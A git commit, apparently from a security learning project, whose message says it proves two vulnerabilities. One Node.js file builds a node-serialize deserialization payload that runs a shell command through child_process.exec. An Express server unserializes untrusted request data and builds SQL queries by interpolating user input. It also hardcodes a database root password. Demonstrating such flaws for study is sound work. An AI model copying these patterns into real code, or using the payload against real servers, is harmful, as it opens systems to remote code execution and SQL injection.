ffcbd7cc5f08e41fd5846a8accc74e0e80c3fc56
LAMSSAOUI ABDELALI <lam998216@gmail.com>
2024-02-19 16:16:26 +0100

    prouving two vulnerabilities

--- serilize.js
+++ serilize.js
@@ -1,16 +1,24 @@
 var serialize = require('node-serialize');
 
-var m = {
-	myOutput: function() {
-		return 'Hello';
-	}
-}
+// var m = {
+// 	myOutput: function() {
+// 		return 'Hello';
+// 	}
+// }
 
-console.log("Serialized: \n" + serialize.serialize(m) + "\n");
+// console.log("Serialized: \n" + serialize.serialize(m) + "\n");
 
-var km = {
-	"username": "_$$ND_FUNC$$_function(){ return 'Hello'; }()",
-	"gender": "Male",
-	"Age": 40
-};
-console.log(serialize.unserialize(km));
+// var km = {
+// 	"username": "_$$ND_FUNC$$_function(){ return 'Hello'; }()",
+// 	"gender": "Male",
+// 	"Age": 40
+// };
+// console.log(serialize.unserialize(km));
+
+var y = {
+    rce : function(){
+    require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) });
+    }(),
+    }
+    var serialize = require('node-serialize');
+    console.log("Serialized: \n" + serialize.serialize(y));
--- server.js
+++ server.js
@@ -80,52 +80,86 @@ const bodyParser = require('body-parser');
 var cookieParser = require('cookie-parser');
 const serialize = require('node-serialize');
 const cors = require('cors');
+const { Sequelize } = require('sequelize');
+// const { Connection } = require('mysql2/typings/mysql/lib/Connection');
 
 const app = express();
 const port = 3000;
 
 const validEmails = ['user1@example.com', 'user2@example.com'];
 
+const sequelize = new Sequelize('desiralization', 'root', 'bouskoura2018', {
+    host: 'localhost',
+    dialect: 'mysql'
+});
+
+
+
 app.use(cors());
 app.use(bodyParser.json()); // Use bodyParser.json() to parse JSON bodies
 app.use(cookieParser())
-app.post('/api/login', (req, res) => {
+
+app.post('/api/login', async (req, res) => {
+    try {
+        await sequelize.authenticate();
+        console.log('Connection has been established successfully.');
+    } catch (error) {
+        console.error('Unable to connect to the database:', error);
+        return;
+    }
+  
+
     const serializedData = req.body; // Assuming the data is sent as JSON
+    console.log('The serialized data is:', serializedData);
+
     console.log('The serialized data is:', serializedData.data);
 
-    // Deserialize the serialized data
+    
     const deserializedData = serialize.unserialize(serializedData.data)
-    // const deserializedData = deserialize(serializedData);
 
     console.log('Deserialized data:', deserializedData);
 
     const { username, password } = deserializedData;
 
-    if (validEmails.includes(username)) {
-            res.send('Valid credentials. Logging in...');
+
+    const sql = `SELECT * FROM users WHERE name = '${username}' and password = ${password}`;
+    try {
+        const [rows] = await sequelize.query(sql);
+        console.log('rows are ', rows)
+        if (rows.length >= 1) {
+            res.json(rows);
+        } else {
+            res.status(404).send('User not found');
+        }
+    } catch (error) {
+        console.error('Error executing SQL query:', error);
+        res.status(500).send('Internal Server Error');
+    }
+
+});
+app.get('/:id', async function (req, res) {
+    // Extract id from URL params
+    const id = req.params.id;
+
+    // Construct SQL query with the id parameter
+    const sql = `SELECT * FROM users WHERE idusers = ${id}`;
+
+    try {
+        // Execute the SQL query
+        const [rows] = await sequelize.query(sql);
         
-    } else {
-        res.send('Invalid email. Please try again.');
+        // Send the fetched data as JSON response
+        res.json(rows);
+    } catch (error) {
+        // Handle errors
+        console.error('Error executing SQL query:', error);
+        res.status(500).send('Internal Server Error');
     }
 });
-app.get('/', function(req, res) {
-	if (req.cookies.profile) {
-		var str = new Buffer(req.cookies.profile, 'base64').toString();
-		var obj = serialize.unserialize(str);
-		if (obj.username) {
-			res.send("Hello " + escape(obj.username));
-		}
-	} else {
-		res.cookie('profile', "eyJ1c2VybmFtZSI6IkpvaG4iLCJnZW5kZXIiOiJNYWxlIiwiQWdlIjogMzV9", {
-			maxAge: 900000,
-			httpOnly: true
-		});
-	}
-	res.send("Welcome to the Serialize-Deserialize Demo!");
-});
 
-app.get('/dashboard', (req, res) => {
-    res.send('Welcome to the dashboard!');
+
+app.get('/api/admin', (req, res) => {
+    res.send('Welcome to the admin !');
 });
 
 app.listen(port, () => {
